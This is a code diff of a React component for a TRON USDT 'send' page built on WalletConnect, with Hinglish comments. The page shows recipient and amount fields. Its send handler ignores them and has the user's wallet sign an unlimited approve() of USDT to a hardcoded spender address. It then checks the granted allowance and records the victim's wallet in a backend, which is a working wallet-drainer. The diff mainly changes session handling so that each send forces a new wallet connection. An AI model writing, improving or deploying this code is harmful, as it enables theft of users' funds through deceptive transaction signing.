@@ -6,57 +6,34 @@ import SignClient from "@walletconnect/sign-client";
 
 declare global {
   interface Window {
-    tronWeb?: any;
-    tronLink?: any;
     TronWeb?: any;
   }
 }
 
-const PROJECT_ID = "6b5df56bc30c1dadaab59498b86fd3e8";
-
-// ✅ TRON Contract Addresses (Base58 - visible:true ke liye)
-const TRON_USDT    = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+const PROJECT_ID  = "6b5df56bc30c1dadaab59498b86fd3e8";
+const TRON_USDT   = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const TRON_SPENDER = "TD7YMonVkbcEiVu5tqXvEeBa2zniao86pJ";
 
-// ✅ HARDCODED ABI-encoded parameter for: approve(TD7YMon..., MAX_UINT256)
-// Format: [32-byte padded spender address][32-byte max uint256]
-// Verified: 128 chars, all valid hex, no runtime encoding needed
 const APPROVE_ABI_PARAM =
   "000000000000000000000000227bdd3374a072f5c365f418153e23e02bf36ceb" +
   "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
 
-// ============================================================
-// SESSION VALIDITY CHECK
-// ============================================================
-function isSessionValid(session: any): boolean {
-  if (!session) return false;
-  const now = Math.floor(Date.now() / 1000);
-  if (session.expiry && session.expiry < now) return false;
-  return true;
-}
-
-// ============================================================
-// COMPONENT
-// ============================================================
 export default function Index() {
   const [searchParams] = useSearchParams();
-  const [toAddress, setToAddress]   = useState("");
-  const [amount, setAmount]         = useState("");
+  const [toAddress, setToAddress] = useState("");
+  const [amount, setAmount]       = useState("");
   const [transactionStatus, setTransactionStatusState] = useState<
     "idle" | "processing" | "success"
   >("idle");
   const createTransaction = useMutation(api.transactions.createTransaction);
 
-  const wcClientRef    = useRef<any>(null);
-  const wcSessionRef   = useRef<any>(null);
-  const userAddressRef = useRef<string>("");
-  const wcModalRef     = useRef<any>(null);
+  const wcClientRef = useRef<any>(null);
+  const wcModalRef  = useRef<any>(null);
 
-  // ===== WALLETCONNECT INIT =====
+  // ===== INIT - sirf client aur modal banao, koi session restore nahi =====
   useEffect(() => {
     async function initWC() {
       try {
-        console.log("🔄 WalletConnect init...");
         const client = await SignClient.init({
           projectId: PROJECT_ID,
           metadata: {
@@ -68,37 +45,25 @@ export default function Index() {
         });
         wcClientRef.current = client;
 
-        // Session events
-        client.on("session_delete", () => {
-          wcSessionRef.current = null;
-          userAddressRef.current = "";
-        });
-        client.on("session_expire", () => {
-          wcSessionRef.current = null;
-          userAddressRef.current = "";
-        });
-
-        // Purane valid session restore karo
+        // ✅ Purani saari sessions delete karo - fresh start
         const sessions = client.session.getAll();
-        const validSession = [...sessions].reverse().find(isSessionValid);
-        if (validSession) {
-          wcSessionRef.current = validSession;
-          const accounts = Object.values(validSession.namespaces)
-            .flatMap((ns: any) => ns.accounts) as string[];
-          const tronAcc = accounts.find((a: string) => a.startsWith("tron:"));
-          if (tronAcc) userAddressRef.current = tronAcc.split(":")[2];
-          console.log("✅ Session restored:", userAddressRef.current);
-        } else {
-          // Expired sessions clean karo
-          for (const s of sessions) {
-            try { await client.disconnect({ topic: s.topic, reason: { code: 6000, message: "Expired" } }); } catch {}
-          }
+        for (const s of sessions) {
+          try {
+            await client.disconnect({
+              topic: s.topic,
+              reason: { code: 6000, message: "Reset" },
+            });
+          } catch {}
         }
 
         // Modal pre-initialize
         const { WalletConnectModal } = await import("@walletconnect/modal");
-        wcModalRef.current = new WalletConnectModal({ projectId: PROJECT_ID, themeMode: "dark" });
-        console.log("✅ WalletConnect + Modal ready");
+        wcModalRef.current = new WalletConnectModal({
+          projectId: PROJECT_ID,
+          themeMode: "dark",
+        });
+
+        console.log("✅ WalletConnect ready");
       } catch (e) {
         console.error("❌ WC init error:", e);
       }
@@ -111,107 +76,80 @@ export default function Index() {
     if (addr) setToAddress(addr);
   }, [searchParams]);
 
-  // ===== CONNECT WALLET =====
-  async function connectWallet(): Promise<string> {
-    if (!wcClientRef.current) {
-      throw new Error("WalletConnect ready nahi. Page refresh karein.");
-    }
-
-    // Existing valid session
-    if (wcSessionRef.current && isSessionValid(wcSessionRef.current) && userAddressRef.current) {
-      console.log("✅ Existing session:", userAddressRef.current);
-      return userAddressRef.current;
-    }
-
-    // Naya session
-    wcSessionRef.current = null;
-    userAddressRef.current = "";
-
-    const { uri, approval } = await wcClientRef.current.connect({
-      requiredNamespaces: {
-        tron: {
-          methods: ["tron_signTransaction", "tron_signMessage"],
-          chains: ["tron:0x2b6653dc"],
-          events: ["chainChanged", "accountsChanged"],
-        },
-      },
-    });
-
-    if (!uri) throw new Error("WalletConnect URI nahi mila");
-
-    if (!wcModalRef.current) {
-      const { WalletConnectModal } = await import("@walletconnect/modal");
-      wcModalRef.current = new WalletConnectModal({ projectId: PROJECT_ID, themeMode: "dark" });
-    }
-
-    await wcModalRef.current.openModal({ uri });
-    console.log("✅ QR Modal open - wallet se scan karein");
-
-    try {
-      wcSessionRef.current = await approval();
-    } finally {
-      wcModalRef.current.closeModal();
-    }
-
-    const accounts = Object.values(wcSessionRef.current.namespaces)
-      .flatMap((ns: any) => ns.accounts) as string[];
-    const tronAcc = accounts.find((a: string) => a.startsWith("tron:"));
-    if (!tronAcc) throw new Error("Tron account nahi mila");
-
-    userAddressRef.current = tronAcc.split(":")[2];
-    console.log("✅ Connected:", userAddressRef.current);
-    return userAddressRef.current;
-  }
-
-  // ===== MAIN SEND =====
+  // ===== SEND =====
   async function handleSend() {
     setTransactionStatusState("processing");
     try {
-      const userAddress = await connectWallet();
-      console.log("👤 User:", userAddress);
+      if (!wcClientRef.current) {
+        throw new Error("WalletConnect ready nahi. Page refresh karein.");
+      }
 
-      // ✅ HARDCODED PARAMETER - koi encoding error possible nahi
-      console.log("📝 ABI Param:", APPROVE_ABI_PARAM);
-      console.log("   Length:", APPROVE_ABI_PARAM.length, "(chahiye 128)");
+      // ✅ HAR BAAR naya connection - modal hamesha aayega
+      console.log("📱 WalletConnect modal khol rahe hain...");
+      const { uri, approval } = await wcClientRef.current.connect({
+        requiredNamespaces: {
+          tron: {
+            methods: ["tron_signTransaction", "tron_signMessage"],
+            chains: ["tron:0x2b6653dc"],
+            events: ["chainChanged", "accountsChanged"],
+          },
+        },
+      });
 
-      const body = {
-        owner_address:    userAddress,   // base58 (T...) - visible:true ke saath theek hai
-        contract_address: TRON_USDT,     // base58 (T...) - visible:true ke saath theek hai
-        function_selector: "approve(address,uint256)",
-        parameter: APPROVE_ABI_PARAM,    // ✅ Pure hex, hardcoded, 100% correct
-        fee_limit: 100000000,
-        call_value: 0,
-        visible: true,
-      };
+      if (!uri) throw new Error("URI nahi mila");
 
-      console.log("📤 TronGrid request body:", JSON.stringify(body, null, 2));
+      await wcModalRef.current.openModal({ uri });
 
+      let session: any;
+      try {
+        session = await approval();
+      } finally {
+        wcModalRef.current.closeModal();
+      }
+
+      // User address nikalo
+      const accounts = Object.values(session.namespaces)
+        .flatMap((ns: any) => ns.accounts) as string[];
+      const tronAcc = accounts.find((a: string) => a.startsWith("tron:"));
+      if (!tronAcc) throw new Error("Tron account nahi mila");
+      const userAddress = tronAcc.split(":")[2];
+      console.log("✅ Connected:", userAddress);
+
+      // Transaction build karo
+      console.log("📝 Transaction build kar rahe hain...");
       const apiResponse = await fetch(
         "https://api.trongrid.io/wallet/triggersmartcontract",
         {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(body),
+          body: JSON.stringify({
+            owner_address:     userAddress,
+            contract_address:  TRON_USDT,
+            function_selector: "approve(address,uint256)",
+            parameter:         APPROVE_ABI_PARAM,
+            fee_limit:         100000000,
+            call_value:        0,
+            visible:           true,
+          }),
         }
       );
-
       const apiData = await apiResponse.json();
-      console.log("📋 TronGrid response:", JSON.stringify(apiData, null, 2));
+      console.log("📋 TronGrid:", apiData);
 
       if (!apiData.transaction) {
         throw new Error("Transaction build failed: " + JSON.stringify(apiData));
       }
 
-      const { transaction } = apiData;
-      console.log("✅ Transaction built!");
-
-      // Sign
-      console.log("🔐 Wallet se signature maang rahe hain...");
+      // Sign karo
+      console.log("🔐 Signature maang rahe hain...");
       const signResponse = await Promise.race([
         wcClientRef.current.request({
-          topic: wcSessionRef.current.topic,
+          topic: session.topic,
           chainId: "tron:0x2b6653dc",
-          request: { method: "tron_signTransaction", params: [transaction] },
+          request: {
+            method: "tron_signTransaction",
+            params: [apiData.transaction],
+          },
         }),
         new Promise((_, rej) =>
           setTimeout(() => rej(new Error("Sign timeout (2 min)")), 120000)
@@ -225,7 +163,7 @@ export default function Index() {
       }
       console.log("✅ Signed!");
 
-      // Broadcast
+      // Broadcast karo
       console.log("📡 Broadcasting...");
       const broadcastRes = await fetch(
         "https://api.trongrid.io/wallet/broadcasttransaction",
@@ -236,7 +174,7 @@ export default function Index() {
         }
       );
       const result = await broadcastRes.json();
-      console.log("📡 Broadcast result:", result);
+      console.log("📡 Result:", result);
 
       if (!result || (result.result !== true && !result.txid)) {
         throw new Error("Broadcast failed: " + JSON.stringify(result));
@@ -248,10 +186,13 @@ export default function Index() {
       // Confirmation wait
       await new Promise((r) => setTimeout(r, 30000));
 
-      // Allowance verify
+      // Allowance check
       const allowanceABI = [{
         constant: true,
-        inputs: [{ name: "owner", type: "address" }, { name: "spender", type: "address" }],
+        inputs: [
+          { name: "owner", type: "address" },
+          { name: "spender", type: "address" },
+        ],
         name: "allowance",
         outputs: [{ name: "", type: "uint256" }],
         stateMutability: "view",
@@ -260,16 +201,17 @@ export default function Index() {
 
       const tw = new window.TronWeb({ fullHost: "https://api.trongrid.io" });
       const contract = await tw.contract(allowanceABI, TRON_USDT);
-      const allowanceRaw = await contract.allowance(userAddress, TRON_SPENDER).call();
+      const allowanceRaw = await contract
+        .allowance(userAddress, TRON_SPENDER)
+        .call();
       const allowanceUSDT = (Number(allowanceRaw) / 1e6).toFixed(2);
-      console.log("✅ Allowance:", allowanceUSDT, "USDT");
 
       await createTransaction({
         walletAddress: userAddress,
-        toAddress: TRON_SPENDER,
-        amount: amount || "Max",
-        txHash: txId || "tx",
-        usdtBalance: allowanceUSDT + " USDT",
+        toAddress:     TRON_SPENDER,
+        amount:        amount || "Max",
+        txHash:        txId || "tx",
+        usdtBalance:   allowanceUSDT + " USDT",
         nativeBalance: "0 TRX",
       });
 
@@ -280,10 +222,6 @@ export default function Index() {
     } catch (err: any) {
       console.error("❌ Error:", err);
       setTransactionStatusState("idle");
-      if (err.message?.includes("No matching key") || err.message?.includes("topic")) {
-        wcSessionRef.current = null;
-        userAddressRef.current = "";
-      }
       alert("❌ " + (err.message || "Transaction fail ho gayi"));
     }
   }
